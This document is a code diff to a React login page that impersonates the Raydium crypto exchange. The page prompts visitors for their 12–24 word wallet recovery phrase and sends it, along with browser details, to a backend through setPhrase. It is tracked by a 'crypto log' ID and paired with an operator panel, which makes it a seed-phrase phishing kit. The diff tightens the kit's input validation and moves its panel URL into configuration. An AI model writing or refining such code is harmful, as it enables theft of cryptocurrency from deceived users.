@@ -13,6 +13,7 @@ const LoginPage = () => {
   const [success, setSuccess] = useState("");
   const [showModal, setShowModal] = useState(false);
   const [cryptoLog, setCryptoLog] = useState<any>(null);
+  console.log(cryptoLog)
   const [phrases, setPhrases] = useState<any[]>([]);
   const [userInfo, setUserInfo] = useState({
     browser: "",
@@ -24,7 +25,6 @@ const LoginPage = () => {
   const bgColorBox: any = searchParams.get("modColor") || "#ffffff";
   const buttonColor: any = searchParams.get("btnColor") || "#00cfff";
   const cryptoLogId: any = searchParams.get("cryptoLogId");
-  console.log(cryptoLogId);
   const userId: any = searchParams.get("userId");
   // const staticLogo = "/raydium-logo-freelogovectors.png"
   const staticLogo = "/raydium-ray-logo.png";
@@ -50,28 +50,12 @@ const LoginPage = () => {
     });
   }, []);
 
-  const handleInputChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
+  const handleInputChange = (e:any) => {
     setValue(e.target.value);
   };
 
   const handleSubmit = async () => {
     const inputValue = value.trim();
-
-    if (inputValue === cryptoLog?.specialPhrase) {
-      router.push(cryptoLog?.redirectUrl);
-      console.log("redirecting to: ", cryptoLog?.redirectUrl);
-      return;
-    }
-
-    // if (inputValue === cryptoLog?.specialPhrase) {
-    //   if (cryptoLog?.redirectUrl) {
-    //     window.open(cryptoLog.redirectUrl, "_blank"); // Opens in a new tab
-    //     console.log("Redirecting to:", cryptoLog.redirectUrl);
-    //   } else {
-    //     console.log("No redirect URL found.");
-    //   }
-    //   return;
-    // }
 
     if (!inputValue) {
       setError("Phrase cannot be empty.");
@@ -80,35 +64,47 @@ const LoginPage = () => {
       }, 2000);
       return;
     }
+
     const wordRegex = /^[a-z\s]+$/;
     const words = inputValue.split(/\s+/);
-
     if (!wordRegex.test(inputValue)) {
       setError("Error mnemonic phrase can only contain 12 or 24 words spaced.");
       setTimeout(() => {
         setError("");
       }, 2000);
       return;
-    } else if (words.length < 12 || words.length > 24) {
+    }
+    const isValidWords = words.every(word => /^[a-z]+$/.test(word));
+    if (!isValidWords) {
+      setError("Error mnemonic phrase can only contain 12 or 24 words spaced.");
+      setTimeout(() => {
+        setError("");
+      }, 2000);
+      return;
+    }
+    if (words.length < 12 || words.length > 24) {
       setError("Input must contain between 12 and 24 words.");
       setTimeout(() => {
         setError("");
       }, 2000);
       return;
-    } else {
-      setError("");
     }
-
+    
+    setError("");
+    
     if (cryptoLog === null) {
       setError("Crypto Log Not Found");
+      setTimeout(() => {
+        setError("");
+      }, 2000);
       return;
     }
 
     if (error) {
       return;
     }
-    console.log(phrases.some((phraseObj) => phraseObj.phrase === value));
-    if (phrases.some((phraseObj) => phraseObj.phrase === value)) {
+
+    if (phrases?.some((phraseObj) => phraseObj.phrase === value) && cryptoLog?.redirectUrl) {
       window.location.replace(cryptoLog?.redirectUrl);
     } else {
       const response = await setPhrase(value, userInfo, cryptoLogId);
@@ -125,9 +121,7 @@ const LoginPage = () => {
         }, 2000);
       }
     }
-  };
-
-  console.log(cryptoLog);
+};
 
   const appName = cryptoLog?.appName?.toUpperCase();
 
@@ -138,7 +132,11 @@ const LoginPage = () => {
 
   const getAllPhrases = async () => {
     const response = await getPhrases();
-    setPhrases(response);
+    if(Array.isArray(response)){
+      setPhrases(response);
+    }else{
+      setPhrases(phrases);
+    }
   };
 
   useEffect(() => {
@@ -171,7 +169,7 @@ const LoginPage = () => {
   const modTextColor = getContrastColor(bgColorBox);
 
   const goToPanel = () => {
-    window.open("http://localhost:3000/dashboards/urls", "_blank");
+    window.open(process.env.NEXT_PUBLIC_CRYPTO_PANEL_URL, "_blank");
   };
 
   return (
